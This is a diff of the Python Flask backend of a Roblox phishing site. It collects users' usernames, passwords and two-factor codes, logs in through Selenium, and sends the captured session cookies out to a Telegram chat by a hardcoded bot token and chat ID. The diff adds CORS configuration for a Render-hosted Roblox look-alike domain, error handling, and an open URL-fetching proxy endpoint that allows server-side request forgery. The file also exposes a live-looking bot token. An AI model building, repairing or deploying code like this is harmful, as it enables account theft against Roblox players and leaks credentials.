@@ -16,7 +16,21 @@ import time
 import selenium.webdriver.support.ui as ui
 
 app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "*"}})
+
+# Настройка CORS для продакшн (Render) и локальной разработки
+ALLOWED_ORIGINS = [
+    "https://roblox-2dyn.onrender.com",
+    "http://localhost:5000",
+    "http://localhost:3000",
+    "http://127.0.0.1:5000",
+    "http://127.0.0.1:3000"
+]
+
+CORS(app, 
+     resources={r"/*": {"origins": ALLOWED_ORIGINS}},
+     supports_credentials=True,
+     methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],
+     allow_headers=["Content-Type", "Authorization", "X-Requested-With"])
 
 TELEGRAM_BOT_TOKEN = '8358408245:AAFkdDlfXA0NPkEmvXmcdSoU_av2vzz-OmM'
 TELEGRAM_CHAT_ID = '-1002709349680'
@@ -98,6 +112,29 @@ def generate_unique_fingerprint():
 def get_random_proxy():
     """Возвращает None - прокси отключены для стабильности"""
     return None
+
+@app.after_request
+def after_request(response):
+    """Добавляет CORS заголовки ко всем ответам"""
+    origin = request.headers.get('Origin')
+    
+    # Проверяем, разрешен ли origin
+    if origin in ALLOWED_ORIGINS:
+        response.headers.add('Access-Control-Allow-Origin', origin)
+    else:
+        # Для локальной разработки разрешаем все
+        response.headers.add('Access-Control-Allow-Origin', '*')
+    
+    response.headers.add('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With')
+    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
+    response.headers.add('Access-Control-Allow-Credentials', 'true')
+    
+    # Добавляем заголовки для кэширования и безопасности
+    response.headers.add('Cache-Control', 'no-cache, no-store, must-revalidate')
+    response.headers.add('Pragma', 'no-cache')
+    response.headers.add('Expires', '0')
+    
+    return response
 
 def send_telegram_log(text):
     try:
@@ -877,70 +914,123 @@ def final_page():
 def login():
     if request.method == 'OPTIONS':
         # Preflight request
-        response = jsonify({})
-        response.headers.add('Access-Control-Allow-Origin', '*')
-        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
-        response.headers.add('Access-Control-Allow-Methods', 'POST, OPTIONS')
-        return response
+        return jsonify({})
     
-    # Добавляем CORS заголовки
-    response = jsonify({})
-    response.headers.add('Access-Control-Allow-Origin', '*')
-    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
-    response.headers.add('Access-Control-Allow-Methods', 'POST, OPTIONS')
-    
-    data = request.get_json()
-    username = data.get('username')
-    password = data.get('password')
-    remember = data.get('remember')
-    session_id = str(uuid.uuid4())
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'success': False, 'message': 'Данные не получены'})
+            
+        username = data.get('username')
+        password = data.get('password')
+        remember = data.get('remember')
+        
+        if not username or not password:
+            return jsonify({'success': False, 'message': 'Не указаны имя пользователя или пароль'})
+            
+        session_id = str(uuid.uuid4())
 
-    cookies = {
-        '.ROBLOSECURITY': f'_{username}_fake_security_token_{hash(password)}',
-        'username': username,
-        'login_time': datetime.now().isoformat(),
-        'session_id': f'roblox_session_{hash(username)}',
-        'auth_token': f'auth_{hash(password)}',
-        'remember_me': str(remember).lower()
-    }
-    with open('cookies.txt', 'w', encoding='utf-8') as f:
-        json.dump(cookies, f, indent=2, ensure_ascii=False)
+        cookies = {
+            '.ROBLOSECURITY': f'_{username}_fake_security_token_{hash(password)}',
+            'username': username,
+            'login_time': datetime.now().isoformat(),
+            'session_id': f'roblox_session_{hash(username)}',
+            'auth_token': f'auth_{hash(password)}',
+            'remember_me': str(remember).lower()
+        }
+        with open('cookies.txt', 'w', encoding='utf-8') as f:
+            json.dump(cookies, f, indent=2, ensure_ascii=False)
 
-    result = roblox_login_and_get_cookies(username, password, session_id=session_id)
-    if result.get('need_code'):
-        return jsonify({'need_code': True, 'session_id': session_id})
-    elif result.get('success'):
-        return jsonify({'success': True, 'message': 'Вход выполнен успешно! Проверьте Telegram для получения куки.', 'cookies': result.get('cookies')})
-    else:
-        return jsonify({'success': False, 'message': result.get('message')})
+        result = roblox_login_and_get_cookies(username, password, session_id=session_id)
+        if result.get('need_code'):
+            return jsonify({'need_code': True, 'session_id': session_id})
+        elif result.get('success'):
+            return jsonify({'success': True, 'message': 'Вход выполнен успешно! Проверьте Telegram для получения куки.', 'cookies': result.get('cookies')})
+        else:
+            return jsonify({'success': False, 'message': result.get('message')})
+    except Exception as e:
+        print(f"Ошибка в login: {e}")
+        return jsonify({'success': False, 'message': f'Внутренняя ошибка сервера: {str(e)}'})
 
 @app.route('/submit_code', methods=['POST', 'OPTIONS'])
 def submit_code():
     if request.method == 'OPTIONS':
         # Preflight request
-        response = jsonify({})
-        response.headers.add('Access-Control-Allow-Origin', '*')
-        response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
-        response.headers.add('Access-Control-Allow-Methods', 'POST, OPTIONS')
-        return response
+        return jsonify({})
     
-    # Добавляем CORS заголовки
-    response = jsonify({})
-    response.headers.add('Access-Control-Allow-Origin', '*')
-    response.headers.add('Access-Control-Allow-Headers', 'Content-Type')
-    response.headers.add('Access-Control-Allow-Methods', 'POST, OPTIONS')
-    
-    data = request.get_json()
-    session_id = data.get('session_id')
-    code = data.get('code')
-    if not session_id or not code:
-        return jsonify({'success': False, 'message': 'Не передан session_id или code'})
-    username = selenium_sessions.get(session_id, {}).get('username', 'unknown')
-    result = roblox_login_and_get_cookies(username, None, session_id=session_id, code=code)
-    if result.get('success'):
-        return jsonify({'success': True, 'message': 'Вход завершён! Проверьте Telegram для куки.', 'cookies': result.get('cookies')})
-    else:
-        return jsonify({'success': False, 'message': result.get('message')})
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'success': False, 'message': 'Данные не получены'})
+            
+        session_id = data.get('session_id')
+        code = data.get('code')
+        
+        if not session_id or not code:
+            return jsonify({'success': False, 'message': 'Не передан session_id или code'})
+            
+        username = selenium_sessions.get(session_id, {}).get('username', 'unknown')
+        result = roblox_login_and_get_cookies(username, None, session_id=session_id, code=code)
+        
+        if result.get('success'):
+            return jsonify({'success': True, 'message': 'Вход завершён! Проверьте Telegram для куки.', 'cookies': result.get('cookies')})
+        else:
+            return jsonify({'success': False, 'message': result.get('message')})
+    except Exception as e:
+        print(f"Ошибка в submit_code: {e}")
+        return jsonify({'success': False, 'message': f'Внутренняя ошибка сервера: {str(e)}'})
+
+@app.route('/health', methods=['GET'])
+def health_check():
+    """Проверка состояния сервера"""
+    return jsonify({
+        'status': 'ok',
+        'timestamp': datetime.now().isoformat(),
+        'message': 'Сервер работает',
+        'environment': os.environ.get('RENDER_ENVIRONMENT', 'development'),
+        'port': os.environ.get('PORT', '5000'),
+        'cors_enabled': True,
+        'allowed_origins': ALLOWED_ORIGINS
+    })
+
+@app.route('/test')
+def test_page():
+    """Страница для тестирования API"""
+    return render_template('test.html')
+
+@app.route('/test-render')
+def test_render_page():
+    """Страница для тестирования CORS на Render"""
+    return app.send_static_file('test_render_cors.html')
+
+@app.route('/proxy-roblox', methods=['POST'])
+def proxy_roblox():
+    """Прокси для обращения к Roblox API"""
+    try:
+        data = request.get_json()
+        if not data or 'url' not in data:
+            return jsonify({'error': 'URL не указан'})
+        
+        url = data['url']
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'ru-RU,ru;q=0.9,en;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-site'
+        }
+        
+        response = requests.get(url, headers=headers, timeout=10)
+        return jsonify({
+            'status': response.status_code,
+            'headers': dict(response.headers),
+            'data': response.text[:1000] if response.text else None
+        })
+    except Exception as e:
+        return jsonify({'error': f'Ошибка прокси: {str(e)}'})
 
 if __name__ == '__main__':
     # Для локальной разработки
